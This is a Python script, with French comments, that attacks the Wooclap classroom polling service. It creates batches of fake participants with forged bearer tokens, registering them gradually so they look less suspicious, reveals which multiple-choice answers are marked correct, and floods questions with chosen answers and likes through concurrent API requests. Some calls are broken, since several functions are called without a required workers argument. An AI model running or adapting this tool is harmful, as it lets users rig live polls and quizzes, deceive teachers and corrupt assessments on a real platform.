# _TODO list:
#.Connaitre les questions suivantes
#.Voter réponses qui existent pas

import requests
import random
import os
import concurrent.futures
import sys

id_last_user_answered = {} # Dictionnaire qui sauvegarde le dernier bot à avoir répondu par question (id)

def get_executor(max_workers):
    if "win" in sys.platform:
        return concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
    else:
        return concurrent.futures.ProcessPoolExecutor(max_workers=max_workers)

def generate_users(n):
    return [random.randint(100000000000, 999999999999) for _ in range(n)]

def get_wooclap_headers(user_id):
    return {
        'authority': 'app.wooclap.com',
        'accept': 'application/json',
        'authorization': f'bearer z{user_id}',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

def get_event_data(event_code, user_id):
    headers = get_wooclap_headers(user_id)
    params = {'isParticipant': 'true'}
    response = requests.get(f'https://app.wooclap.com/api/events/{event_code}', params=params, headers=headers)
    return response.json()

def add_users(users, n):
    return users + generate_users(n)

def attack_mcq_question(question, users, questionType, workers):
    global id_last_user_answered

    if not question['_id'] in id_last_user_answered:
        id_last_user_answered[question['_id']] = 0
    
    number_of_users = len(users)
    available_users = number_of_users-id_last_user_answered[question['_id']]

    if available_users == 0:
        return

    choices = []
    print(f"______{questionType}______\n\nQuestion: {question['title']}")
    for i, choice in enumerate(question['choices'], start=1):
        print(f"[{i}] {choice['choice']}" + (f" [Correct: {choice['isCorrect']}]" if questionType == "MCQ" else ""))

    try:
        if question['multipleChoice']:
            print("\nThis is a multiple-choice question. To select several answers, answer like this: '0+2'.")
            answer = input("Which answer(s) do you want to respond?  ('-1' return to the menu)\n> ").replace(" ","").split('+')
            choices = [question['choices'][int(r)-1]['_id'] for r in answer]
        else:
            answer = input("Which answer do you want to respond?  ('-1' return to the menu)\n> ").strip()
            choices = [question['choices'][int(answer)-1]['_id']]
    except:
        return
    if answer == "-1": # Donne l'occasion à l'utilisateur de revenir au menu
        return

    start = 0
    end = int(input(f"How many of them do you want to spam (max: {available_users})?\n> "))+id_last_user_answered[question['_id']]

    if end > number_of_users:
        end = number_of_users

    if id_last_user_answered[question['_id']] != 0:
        start=id_last_user_answered[question['_id']]
    
    with get_executor(workers) as executor:
        for i in range(start, end):
            headers = get_wooclap_headers(users[i])
            json_data = {'choices': choices, 'comment': '', 'token': f'z{users[i]}'}
            executor.submit(requests.post, f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)

    id_last_user_answered[question['_id']] = end
    

def attack_open_question(question, users):
    global id_last_user_answered

    if not question['_id'] in id_last_user_answered:
        id_last_user_answered[question['_id']] = 0

    if len(users)-id_last_user_answered[question['_id']] == 0 and not question['multipleAnswers']: # Si tous les utilisateurs ont été utilisés pour répondre 
        return                                                                                     # et qu'on peut répondre qu'à une seule question
        
    print(f"______Open question______\n\nTitle: {question['title']}")

    if question['allExpectedAnswers']:
        print(f"Expected answers: {question['allExpectedAnswers']}")

    if not question['multipleAnswers']:
        print(len(users)-id_last_user_answered[question['_id']],"réponses restantes")

    answer = input("What do you want to answer? ('-1' return to the menu)\n> ").strip()

    if answer == "-1": # Donne l'occasion à l'utilisateur de revenir au menu
        return
    
    if not len(users)-id_last_user_answered[question['_id']] == 0: # Par précaution même si on peut répondre plusieurs fois on compte
        id_last_user_answered[question['_id']] += 1                # pour si le paramètre est changé par le professeur, dans ce cas là
                                                                   # on ne pourrait plus répondre si on a atteint le quota 
    json_data = {'text': answer, 'image': None}
    headers = get_wooclap_headers(users[id_last_user_answered[question['_id']]] if not question['multipleAnswers'] else users[0])
    response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
    response = response.json()

    if question['canLike']:
        number_of_likes = min(int(input(f"How many likes do you want to your answer? (MAX: {len(users)})\n> ").strip()), len(users))
        with get_executor(workers) as executor:
            for i in range(number_of_likes):
                headers = get_wooclap_headers(users[i])
                json_data = {'toggle': True}
                executor.submit(requests.post, f'https://app.wooclap.com/api/questions/{question["_id"]}/answers/{response["userAnswer"]["_id"]}/toggle_like', headers=headers, json=json_data)

def create_users(list_of_users, event_code, workers):
    os.system('cls||clear')
    print("######################################")
    print("######### CREATING THE USERS #########")
    print("######################################")
    
    with get_executor(workers) as executor:
        for user in list_of_users: # Augmente le nombre d'utilisateurs dés leur initialisation pour paraitre moins suspect
            executor.submit(requests.post, f"https://app.wooclap.com/api/user?slug={event_code}", headers=get_wooclap_headers(user))
 

number_of_users = int(input("How many users do you want to create?\n> "))
list_of_users = generate_users(number_of_users)

event_code = input("What is the event code of the Wooclap?\n> ")

workers = int(input("How many workers do you want ? "))

create_users(list_of_users, event_code, workers)

while True:
    os.system('cls||clear')
    print("################ MENU ################\n")
    print("[1] Attack the question")
    print("[2] Add new users (Current: {})".format(len(list_of_users)))
    print("[3] Change the event code (Current: {})".format(event_code))
    print("[4] EXIT")

    try:
        choice = int(input("> ").strip())
    except:
        continue

    if choice == 2:

        add_numb = int(input("How many users do you want to add?\n> ").strip())
        list_of_users = add_users(list_of_users, add_numb)
        len_list_users = len(list_of_users)

        create_users(list_of_users, event_code)
        continue

    elif choice == 3:

        new_event_code = input("What is the event code of the Wooclap?\n> ")

        if new_event_code == event_code: # Vérifie que c'est pas le même code qui a été rentré pour ne pas perdre de temps de vouloir recréer les utilisateurs si c'est le cas
            continue
        event_code = new_event_code
        create_users(list_of_users, event_code)
        continue

    elif choice == 4:

        os.system('cls||clear')
        break

    os.system('cls||clear')

    headers = get_wooclap_headers(list_of_users[0])
    data = get_event_data(event_code, list_of_users[0])
    number_of_questions = len(data["questions"])
    id_in_number = 0

    try: # Si il n'arrive pas à trouver une question sélectionnée, il revient au menu 
        for i in range(number_of_questions):
            if data["questions"][i]["_id"] == data["selectedQuestion"]:
                break
            id_in_number += 1
        question = data["questions"][id_in_number]
    except:
        continue

    if question["__t"] == "MCQ" or question["__t"] == "Poll":
        attack_mcq_question(question, list_of_users, question["__t"], workers)
    elif question["__t"] == "OpenQuestion":
        attack_open_question(question, list_of_users)